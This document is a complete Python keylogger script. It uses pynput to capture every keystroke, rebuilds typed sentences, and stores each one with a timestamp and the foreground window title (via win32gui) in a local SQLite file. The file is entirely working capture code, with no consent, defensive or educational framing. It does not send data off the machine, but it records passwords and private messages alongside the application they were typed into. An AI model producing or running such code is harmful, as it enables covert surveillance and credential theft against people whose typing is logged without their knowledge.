from pynput import keyboard
import sqlite3
from datetime import datetime
import os

try:
    import win32gui
except ImportError:
    win32gui = None

# Buffer to collect characters before Enter
sentence_buffer = []

# Create database and table if not exist
def init_db():
    conn = sqlite3.connect("keylogs.db")
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            window_title TEXT,
            sentence TEXT
        )
    ''')
    conn.commit()
    conn.close()

# Function to get current window title (Windows only)
def get_active_window_title():
    if win32gui:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        return title
    return "Unknown Window"

# Write to DB - with separate connection
def write_to_db(sentence):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    window_title = get_active_window_title()
    conn = sqlite3.connect("keylogs.db")  # Make connection inside thread
    c = conn.cursor()
    c.execute("INSERT INTO logs (timestamp, window_title, sentence) VALUES (?, ?, ?)",
              (timestamp, window_title, sentence))
    conn.commit()
    conn.close()
    print(f"💾 Logged: [{window_title}] {sentence}")

# Handle key presses
def on_press(key):
    global sentence_buffer

    try:
        if hasattr(key, 'char') and key.char is not None:
            sentence_buffer.append(key.char)
        elif key == keyboard.Key.space:
            sentence_buffer.append(' ')
        elif key == keyboard.Key.backspace:
            if sentence_buffer:
                sentence_buffer.pop()
        elif key == keyboard.Key.enter:
            sentence = ''.join(sentence_buffer).strip()
            if sentence:
                write_to_db(sentence)
            sentence_buffer = []
    except Exception as e:
        print("Error:", e)

def start_keylogger():
    print("🔐 Keylogger running... (press Enter to log sentences)")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    init_db()
    start_keylogger()
